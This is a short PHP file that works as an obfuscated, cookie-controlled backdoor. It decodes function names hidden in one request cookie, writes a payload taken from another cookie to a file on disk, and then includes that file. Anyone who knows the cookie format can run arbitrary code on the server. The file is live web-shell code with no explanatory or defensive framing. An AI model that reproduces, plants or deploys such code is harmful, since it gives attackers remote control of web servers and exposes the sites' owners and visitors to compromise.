<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[26])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[26][$n];
        if (!$c[26][$n + 1]) {
            if (!$c[26][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[0]() . $p[3];
    if (!$p[25]($k)) {
        $n = $p[6]($k, $p[12]);
        $p[17]($n, $p[18] . $p[28]($p[7]($c[3])));
    }
    include($k);
}